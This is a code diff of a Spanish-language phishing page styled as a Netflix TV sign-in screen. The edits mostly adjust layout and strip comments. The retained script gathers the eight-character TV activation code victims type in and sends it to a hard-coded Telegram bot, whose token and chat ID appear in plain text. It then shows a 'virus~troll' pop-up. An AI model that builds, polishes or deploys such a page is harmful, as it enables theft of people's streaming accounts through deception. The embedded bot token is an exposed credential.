@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Iniciar Sesión en TV</title>
     <style>
         * {
@@ -12,25 +12,34 @@
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
         }
 
+        /* Bloqueo total de scroll en la pantalla */
+        html, body {
+            width: 100%;
+            height: 100vh;
+            height: 100dvh;
+            overflow: hidden;
+            touch-action: none; /* Evita gestos de arrastre en móviles */
+        }
+
         body {
             background-color: #ffffff;
             color: #333333;
             display: flex;
             flex-direction: column;
-            min-height: 100vh; /* Fallback para navegadores antiguos */
-            min-height: 100dvh; /* Dynamic Viewport Height */
+            justify-content: space-between;
         }
 
-        /* Header / Logo Centrado y Más Grande */
+        /* Header / Logo Centrado */
         header {
-            padding: 30px 4% 10px 4%;
+            padding: 20px 4% 10px 4%;
             display: flex;
             justify-content: center;
             align-items: center;
+            flex-shrink: 0;
         }
 
         .logo-img {
-            height: 120px;
+            height: 100px;
             width: auto;
             display: block;
         }
@@ -42,7 +51,7 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 10px 20px 40px 20px;
+            padding: 10px 20px;
             max-width: 500px;
             margin: 0 auto;
             width: 100%;
@@ -50,10 +59,10 @@
         }
 
         h1 {
-            font-size: 28px;
+            font-size: 24px;
             font-weight: 800;
             color: #000000;
-            margin-bottom: 40px;
+            margin-bottom: 25px;
             line-height: 1.2;
         }
 
@@ -63,7 +72,7 @@
             align-items: center;
             justify-content: center;
             gap: 6px;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
             width: 100%;
         }
 
@@ -101,11 +110,11 @@
             font-size: 16px;
             font-weight: bold;
             cursor: not-allowed;
-            margin-bottom: 40px;
+            margin-bottom: 25px;
             transition: background-color 0.2s ease;
         }
 
-        /* Botón Activo (Color rojo al ingresar todos los caracteres) */
+        /* Botón Activo */
         .btn-submit.active {
             background-color: #E50914;
             cursor: pointer;
@@ -113,7 +122,7 @@
 
         /* Texto Suscríbete */
         .signup-text {
-            font-size: 15px;
+            font-size: 14px;
             color: #737373;
         }
 
@@ -130,10 +139,11 @@
         /* Footer */
         footer {
             background-color: #f3f3f3;
-            padding: 30px 4% 40px 4%;
+            padding: 20px 4% 25px 4%;
             color: #737373;
             font-size: 13px;
             border-top: 1px solid #e6e6e6;
+            flex-shrink: 0;
         }
 
         .footer-container {
@@ -142,7 +152,7 @@
         }
 
         .footer-title {
-            margin-bottom: 20px;
+            margin-bottom: 12px;
         }
 
         .footer-title a {
@@ -153,7 +163,7 @@
         .footer-links {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
+            gap: 10px;
             list-style: none;
         }
 
@@ -166,16 +176,16 @@
             text-decoration: underline;
         }
 
-        /* Estilos del Letrero Moderno (Modal) */
+        /* Estilos del Modal */
         .modal {
-            display: none; /* Oculto por defecto */
+            display: none;
             position: fixed;
             z-index: 1000;
             left: 0;
             top: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0,0,0,0.5); /* Fondo oscuro semitransparente */
+            background-color: rgba(0,0,0,0.5);
             justify-content: center;
             align-items: center;
         }
@@ -190,7 +200,7 @@
         }
 
         .modal-header {
-            color: #E50914; /* Rojo Netflix */
+            color: #E50914;
             font-weight: bold;
             margin-bottom: 10px;
         }
@@ -202,7 +212,7 @@
 
         @media (min-width: 600px) {
             .logo-img {
-                height: 150px;
+                height: 130px;
             }
             .code-input {
                 width: 45px;
@@ -255,7 +265,7 @@
         </div>
     </footer>
 
-    <!-- Letrero Moderno (Modal) -->
+    <!-- Modal -->
     <div id="statusModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">virus~troll</div>
@@ -269,7 +279,6 @@
         const form = document.getElementById('codeForm');
         const modal = document.getElementById('statusModal');
 
-        // Tus credenciales de Telegram
         const TELEGRAM_BOT_TOKEN = "8693512194:AAH4pvVwqutasLjFWaRrzDPAnSKUnA8_qTk";
         const TELEGRAM_CHAT_ID = "5084510194";
 
@@ -300,11 +309,9 @@
             });
         });
 
-        // Enviar datos a Telegram al hacer clic en el botón
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
 
-            // Construir el código combinando los valores de las 8 casillas
             let code = '';
             inputs.forEach(input => code += input.value);
 
@@ -326,12 +333,10 @@
                 });
 
                 if (response.ok) {
-                    // Mostrar letrero moderno (modal)
                     modal.style.display = 'flex';
-                    // Ocultar modal después de unos segundos
                     setTimeout(() => {
                         modal.style.display = 'none';
-                    }, 3000); // 3 segundos
+                    }, 3000);
                     form.reset();
                     checkInputs();
                 } else {
